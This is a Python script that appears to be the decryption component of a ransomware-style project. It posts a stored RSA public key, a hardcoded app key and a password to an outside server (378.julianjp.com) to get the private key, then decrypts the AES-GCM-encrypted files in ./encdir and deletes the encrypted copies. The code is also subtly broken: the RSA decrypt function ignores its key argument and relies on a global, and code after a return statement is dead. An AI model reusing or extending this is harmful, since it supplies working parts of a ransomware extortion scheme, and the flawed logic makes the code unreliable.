import os
import sys
import json
import base64

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_der_private_key

from os import listdir
from os.path import isfile, join

import requests

def Mydecrypt(ciphertext, tag, iv, key):
  decryptor = Cipher(
      algorithms.AES(key),
      modes.GCM(iv, tag),
      backend=default_backend()
  ).decryptor()

  return decryptor.update(ciphertext) + decryptor.finalize()

# Takes a key cipher and a pem filepath
# Returns the decrypted key
def MyRSADecrypt(key_cipher, pem_file):
  key = pem.decrypt(
    key_cipher,
    padding.OAEP(
      mgf=padding.MGF1(algorithm=hashes.SHA1()),
      algorithm=hashes.SHA1(),
      label=None
    )
  )

  return key

def MyfileDecrypt(filepath, rsa_pem):
  file_name = os.path.splitext(filepath)[0]
  
  with open(filepath, 'r') as f:
    data = json.load(f)
    
    iv = base64.b64decode(data['iv'])
    ciphertext = base64.b64decode(data['ciphertext_base64'])
    tag = base64.b64decode(data['tag'])
    
    key_encby_rsa = base64.b64decode(data['RSACipher'])
    key = MyRSADecrypt(key_encby_rsa, rsa_pem)
  
    plaintext = Mydecrypt(ciphertext, tag, iv, key)
    
    output_filename = file_name + data['file_extension']
    
    f = open(output_filename, 'wb')
    f.write(plaintext)
    f.close()
    
    return output_filename
    
def get_rsa_pem():
  password = '';
  recoveryPassword = '';
    
  with open('/tmp/hax_rsa.pub', 'rb') as pub_file:
    pub = serialization.load_pem_public_key(
      pub_file.read(),
      backend=default_backend()
    )
    pub_file.close()
    
    pub_raw = pub.public_bytes(
      encoding=serialization.Encoding.PEM,
      format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    
    payload = {
      'pub': pub_raw,
      'app_key': '123123kj123123123kjjlkjlkj123',
      'password': recoveryPassword
    }
    r = requests.post('https://378.julianjp.com/decrypt', data=payload)
    
    pem_raw = json.loads(r.text)['pem']
    
    b64data = '\n'.join(pem_raw.splitlines()[1:-1])
    derdata = base64.b64decode(b64data)
    pem = load_der_private_key(derdata, None, backend=default_backend())
    
    return pem
    
    with open("/tmp/hax_rsa.pem", 'wb') as file:
      file.write(pem_raw)
      file.close()
      with open("/tmp/hax_rsa.pem", 'rb') as pem_file:
        print('hi', pem_file.read())
        # pem = serialization.load_pem_private_key(
        #   pem_file.read(),
        #   '',
        #   backend=default_backend()
        # )
        # pem_file.close()
      
        
        # print(pem)
        
    
        # return pem

pem = get_rsa_pem()

# filepath = sys.argv[sys.argv.index('--decrypt') + 1]
filepath = './encdir/'

filenames = [f for f in listdir(filepath) if isfile(join(filepath, f))]
for file in filenames:
  output_filename = MyfileDecrypt(os.path.join(filepath, file), pem)

  os.remove(filepath + file)


# Based from for encrypt() and decrypt() methods taken from https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/
